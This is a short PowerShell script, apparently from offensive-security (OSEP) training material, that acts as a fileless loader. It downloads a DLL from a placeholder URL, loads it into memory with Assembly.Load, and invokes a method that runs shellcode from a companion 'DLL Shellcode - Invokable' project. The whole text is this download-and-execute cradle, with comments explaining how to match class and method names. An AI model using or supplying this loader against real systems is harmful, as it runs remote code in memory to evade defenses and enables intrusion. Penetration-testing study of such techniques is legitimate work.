#exploit.dll should be the [DLL Shellcode - Invokable] project artifact. Shellcode_Invokable.dll
$data = (New-Object System.Net.WebClient).DownloadData('{HTTP_URL}/call-invokable.dll')

$assem = [System.Reflection.Assembly]::Load($data)

#The type names below should match the class and method names set in the [DLL Shellcode - Invokable] project.
$class = $assem.GetType("OSEP.OSEPRunner")
$method = $class.GetMethod("OSEPExec")


$method.Invoke(0, $null)